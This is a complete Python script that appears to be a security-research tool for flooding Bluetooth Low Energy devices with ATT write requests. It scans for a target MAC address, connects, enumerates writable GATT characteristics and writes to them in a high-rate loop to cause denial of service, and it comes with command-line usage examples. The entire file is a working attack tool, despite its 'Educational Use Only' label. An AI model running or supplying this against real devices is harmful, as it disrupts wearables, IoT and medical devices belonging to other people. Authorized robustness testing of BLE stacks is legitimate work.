#!/usr/bin/env python3
"""
BLE ATT Write Flood Attack - Python 3.11+
=========================================

Floods a BLE device with ATT (Attribute Protocol) write requests to cause
denial of service by overwhelming the target device's processing capability.

Attack Mechanism:
-----------------
1. Connects to target BLE device
2. Discovers ATT characteristics
3. Floods writable characteristics with write requests
4. Overwhelms device processing, causing DoS

Technical Details:
------------------
- Protocol Layer: ATT (Attribute Protocol)
- Opcode: 0x12 (ATT Write Request)
- Target: GATT characteristics with write permissions
- Rate: High-frequency write operations
- Impact: CPU exhaustion, battery drain, connection instability

Requirements:
-------------
- BLE adapter (built-in or USB dongle)
- bleak>=0.21.0 for async BLE operations
- Target device MAC address
- Root/sudo privileges (for some adapters)

Usage:
------
    # Flood specific device
    sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF

    # Flood with custom rate and duration
    sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF \\
        --rate 1000 --duration 60

    # Flood specific characteristic
    sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF \\
        --characteristic 0000ff01-0000-1000-8000-00805f9b34fb

Author: Wireless Security Research
License: Educational Use Only
Python Version: 3.11+
Performance: ~800 writes/sec (BLE stack limited)
"""

import sys
import asyncio
import time
import signal
import argparse
from dataclasses import dataclass, field
from typing import Optional
from pathlib import Path
import struct

try:
    from bleak import BleakClient, BleakScanner
    from bleak.exc import BleakError
except ImportError:
    print("[!] Error: bleak not installed")
    print("    Install: pip3 install bleak>=0.21.0")
    sys.exit(1)

# ============================================================================
# Configuration
# ============================================================================

@dataclass
class ATTFloodConfig:
    """ATT write flood attack configuration"""
    target_address: str
    target_characteristic: str | None = None  # None = flood all writable

    # Attack parameters
    rate: float = 100.0  # Writes per second
    count: int | None = None  # None = unlimited
    duration: int | None = None  # None = unlimited

    # Write parameters
    write_value: bytes = b"\x00" * 20  # Default 20-byte payload
    write_type: str = "request"  # "request" or "command" (no response)

    # Connection parameters
    connection_timeout: float = 10.0
    scan_timeout: float = 5.0

    # Logging
    log_file: Path = Path("./att_flood.log")
    verbose: bool = True

    def validate(self):
        """Validate configuration"""
        errors = []

        if not self.target_address:
            errors.append(ValueError("Target address required"))

        # Basic MAC address format check
        if ":" not in self.target_address and "-" not in self.target_address:
            errors.append(ValueError(f"Invalid MAC address format: {self.target_address}"))

        if self.rate <= 0:
            errors.append(ValueError(f"Invalid rate: {self.rate}"))

        if self.count and self.count <= 0:
            errors.append(ValueError(f"Invalid count: {self.count}"))

        if self.duration and self.duration <= 0:
            errors.append(ValueError(f"Invalid duration: {self.duration}"))

        if self.write_type not in ["request", "command"]:
            errors.append(ValueError(f"Invalid write type: {self.write_type}"))

        if errors:
            raise ExceptionGroup("Configuration validation failed", errors)


# ============================================================================
# Statistics
# ============================================================================

@dataclass
class AttackStatistics:
    """Real-time attack statistics"""
    start_time: float = field(default_factory=time.time)
    writes_sent: int = 0
    writes_succeeded: int = 0
    writes_failed: int = 0
    bytes_sent: int = 0
    characteristics_found: int = 0
    running: bool = True

    def record_write(self, success: bool, size: int):
        """Record write attempt"""
        self.writes_sent += 1
        if success:
            self.writes_succeeded += 1
            self.bytes_sent += size
        else:
            self.writes_failed += 1

    def get_elapsed_time(self) -> float:
        """Get elapsed time"""
        return time.time() - self.start_time

    def get_write_rate(self) -> float:
        """Calculate writes per second"""
        elapsed = self.get_elapsed_time()
        return self.writes_sent / elapsed if elapsed > 0 else 0


# ============================================================================
# BLE ATT Write Flood Attack
# ============================================================================

class BLEATTFloodAttack:
    """BLE ATT Write Flood Attack Implementation"""

    def __init__(self, config: ATTFloodConfig):
        self.config = config
        self.config.validate()

        self.stats = AttackStatistics()
        self.client: Optional[BleakClient] = None
        self.writable_characteristics: list = []

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle termination signals"""
        print("\n[!] Received signal, stopping attack...")
        self.stats.running = False

    def _print_banner(self):
        """Print attack banner"""
        print("=" * 70)
        print("  BLE ATT Write Flood Attack")
        print("=" * 70)
        print(f"Target Device:       {self.config.target_address}")
        print(f"Target Characteristic: {self.config.target_characteristic or 'All writable'}")
        print(f"Write Type:          {self.config.write_type}")
        print(f"Rate:                {self.config.rate} writes/sec")
        print(f"Payload Size:        {len(self.config.write_value)} bytes")

        if self.config.count:
            print(f"Count:               {self.config.count} writes")
        if self.config.duration:
            print(f"Duration:            {self.config.duration} seconds")

        print("=" * 70)
        print()

    def _print_stats(self):
        """Print attack statistics"""
        elapsed = self.stats.get_elapsed_time()
        rate = self.stats.get_write_rate()
        success_rate = (self.stats.writes_succeeded / self.stats.writes_sent * 100) if self.stats.writes_sent > 0 else 0

        print(f"\r[*] Writes: {self.stats.writes_sent:,} | "
              f"Success: {self.stats.writes_succeeded:,} ({success_rate:.1f}%) | "
              f"Failed: {self.stats.writes_failed:,} | "
              f"Rate: {rate:.1f}/s | "
              f"Time: {elapsed:.1f}s", end='', flush=True)

    def _print_final_stats(self):
        """Print final statistics"""
        elapsed = self.stats.get_elapsed_time()
        avg_rate = self.stats.get_write_rate()
        success_rate = (self.stats.writes_succeeded / self.stats.writes_sent * 100) if self.stats.writes_sent > 0 else 0

        print("\n\n" + "=" * 70)
        print("  Attack Complete - Final Statistics")
        print("=" * 70)
        print(f"Total Writes Sent:       {self.stats.writes_sent:,}")
        print(f"Successful Writes:       {self.stats.writes_succeeded:,} ({success_rate:.1f}%)")
        print(f"Failed Writes:           {self.stats.writes_failed:,}")
        print(f"Total Bytes Sent:        {self.stats.bytes_sent:,}")
        print(f"Characteristics Targeted: {len(self.writable_characteristics)}")
        print(f"Duration:                {elapsed:.2f} seconds")
        print(f"Average Rate:            {avg_rate:.1f} writes/sec")
        print("=" * 70)

    async def scan_for_device(self) -> bool:
        """Scan for target device"""
        print(f"[*] Scanning for device {self.config.target_address}...")

        try:
            devices = await BleakScanner.discover(timeout=self.config.scan_timeout)

            for device in devices:
                if device.address.upper() == self.config.target_address.upper():
                    print(f"[+] Found device: {device.name or 'Unknown'} ({device.address})")
                    print(f"    RSSI: {device.rssi} dBm")
                    return True

            print(f"[!] Device not found in scan")
            return False

        except Exception as e:
            print(f"[!] Scan error: {e}")
            return False

    async def connect(self) -> bool:
        """Connect to target device"""
        print(f"[*] Connecting to {self.config.target_address}...")

        try:
            self.client = BleakClient(
                self.config.target_address,
                timeout=self.config.connection_timeout
            )

            await self.client.connect()

            if self.client.is_connected:
                print(f"[+] Connected successfully")
                return True
            else:
                print(f"[!] Connection failed")
                return False

        except BleakError as e:
            print(f"[!] Connection error: {e}")
            return False
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            return False

    async def discover_characteristics(self):
        """Discover writable characteristics"""
        if not self.client or not self.client.is_connected:
            return

        print("[*] Discovering characteristics...")

        try:
            # Get all services
            services = self.client.services

            for service in services:
                for char in service.characteristics:
                    # Check if characteristic is writable
                    if "write" in char.properties or "write-without-response" in char.properties:
                        self.writable_characteristics.append(char)

                        if self.config.verbose:
                            print(f"    Found writable: {char.uuid}")
                            print(f"        Properties: {', '.join(char.properties)}")

            self.stats.characteristics_found = len(self.writable_characteristics)
            print(f"[+] Found {len(self.writable_characteristics)} writable characteristic(s)")

            # If specific characteristic requested, filter
            if self.config.target_characteristic:
                self.writable_characteristics = [
                    c for c in self.writable_characteristics
                    if str(c.uuid).lower() == self.config.target_characteristic.lower()
                ]

                if not self.writable_characteristics:
                    print(f"[!] Target characteristic {self.config.target_characteristic} not found or not writable")
                else:
                    print(f"[+] Targeting specific characteristic: {self.config.target_characteristic}")

        except Exception as e:
            print(f"[!] Discovery error: {e}")

    def _check_stop_conditions(self) -> bool:
        """Check if attack should stop"""
        match (self.config.count, self.config.duration):
            case (count, _) if count and self.stats.writes_sent >= count:
                return True
            case (_, duration) if duration and self.stats.get_elapsed_time() >= duration:
                return True
            case _:
                return False

    async def execute_flood(self):
        """Execute the write flood attack"""
        if not self.writable_characteristics:
            print("[!] No writable characteristics found")
            return

        print(f"\n[+] Starting ATT write flood...")
        print(f"[!] Press Ctrl+C to stop\n")

        write_delay = 1.0 / self.config.rate if self.config.rate > 0 else 0
        char_index = 0
        last_stats_time = time.time()

        try:
            while self.stats.running:
                # Check stop conditions
                if self._check_stop_conditions():
                    break

                # Select characteristic (round-robin)
                char = self.writable_characteristics[char_index % len(self.writable_characteristics)]
                char_index += 1

                try:
                    # Choose write method based on type
                    if self.config.write_type == "command":
                        # Write without response (faster)
                        await self.client.write_gatt_char(
                            char.uuid,
                            self.config.write_value,
                            response=False
                        )
                    else:
                        # Write with response (reliable)
                        await self.client.write_gatt_char(
                            char.uuid,
                            self.config.write_value,
                            response=True
                        )

                    self.stats.record_write(True, len(self.config.write_value))

                except BleakError as e:
                    self.stats.record_write(False, 0)
                    if self.stats.writes_failed < 5:  # Only show first few errors
                        print(f"\n[!] Write error: {e}")
                except Exception as e:
                    self.stats.record_write(False, 0)
                    if self.stats.writes_failed < 5:
                        print(f"\n[!] Unexpected error: {e}")

                # Rate limiting
                if write_delay > 0:
                    await asyncio.sleep(write_delay)

                # Show stats every second
                if time.time() - last_stats_time >= 1.0:
                    self._print_stats()
                    last_stats_time = time.time()

        except asyncio.CancelledError:
            print("\n[!] Attack cancelled")
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")

    async def disconnect(self):
        """Disconnect from device"""
        if self.client and self.client.is_connected:
            print("\n[*] Disconnecting...")
            try:
                await self.client.disconnect()
                print("[+] Disconnected")
            except Exception as e:
                print(f"[!] Disconnect error: {e}")

    async def run(self):
        """Execute complete attack"""
        self._print_banner()

        try:
            # Step 1: Scan for device
            if not await self.scan_for_device():
                print("[!] Attack aborted: Device not found")
                return 1

            # Step 2: Connect
            if not await self.connect():
                print("[!] Attack aborted: Connection failed")
                return 1

            # Step 3: Discover characteristics
            await self.discover_characteristics()

            if not self.writable_characteristics:
                print("[!] Attack aborted: No writable characteristics")
                await self.disconnect()
                return 1

            # Step 4: Execute flood
            await self.execute_flood()

        except Exception as e:
            print(f"\n[!] Attack error: {e}")
        finally:
            await self.disconnect()
            self._print_final_stats()

        return 0 if self.stats.writes_sent > 0 else 1


# ============================================================================
# CLI
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="BLE ATT Write Flood Attack (Python 3.11+)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic flood attack
  sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF

  # High-rate flood
  sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF --rate 1000

  # Flood specific characteristic
  sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF \\
      --characteristic 0000ff01-0000-1000-8000-00805f9b34fb

  # Time-limited flood
  sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF --duration 60

  # Write commands (no response, faster)
  sudo python3 att_write_flood.py --target AA:BB:CC:DD:EE:FF \\
      --write-type command --rate 500

Requirements:
  - BLE adapter
  - bleak>=0.21.0
  - Root privileges (some adapters)

Educational Use Only - Requires proper authorization
        """
    )

    # Required arguments
    parser.add_argument('--target', required=True,
                       help='Target device MAC address (e.g., AA:BB:CC:DD:EE:FF)')

    # Optional arguments
    parser.add_argument('--characteristic',
                       help='Specific characteristic UUID to target')
    parser.add_argument('--rate', type=float, default=100.0,
                       help='Writes per second (default: 100)')
    parser.add_argument('--count', type=int,
                       help='Number of writes (default: unlimited)')
    parser.add_argument('--duration', type=int,
                       help='Attack duration in seconds')

    # Write parameters
    parser.add_argument('--write-value', default="00" * 20,
                       help='Hex string to write (default: 20 zero bytes)')
    parser.add_argument('--write-type', choices=['request', 'command'], default='request',
                       help='Write type: request (with response) or command (no response)')

    # Connection parameters
    parser.add_argument('--connection-timeout', type=float, default=10.0,
                       help='Connection timeout in seconds (default: 10)')
    parser.add_argument('--scan-timeout', type=float, default=5.0,
                       help='Scan timeout in seconds (default: 5)')

    # Logging
    parser.add_argument('--log-file', default='./att_flood.log',
                       help='Log file path (default: ./att_flood.log)')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose logging')

    return parser.parse_args()


def main() -> int:
    """Main entry point"""
    args = parse_arguments()

    # Convert hex string to bytes
    try:
        write_value = bytes.fromhex(args.write_value.replace(" ", ""))
    except ValueError:
        print(f"[!] Invalid hex string: {args.write_value}")
        return 1

    # Build configuration
    config = ATTFloodConfig(
        target_address=args.target,
        target_characteristic=args.characteristic,
        rate=args.rate,
        count=args.count,
        duration=args.duration,
        write_value=write_value,
        write_type=args.write_type,
        connection_timeout=args.connection_timeout,
        scan_timeout=args.scan_timeout,
        log_file=Path(args.log_file),
        verbose=args.verbose
    )

    # Run attack
    attack = BLEATTFloodAttack(config)
    return asyncio.run(attack.run())


if __name__ == '__main__':
    sys.exit(main())
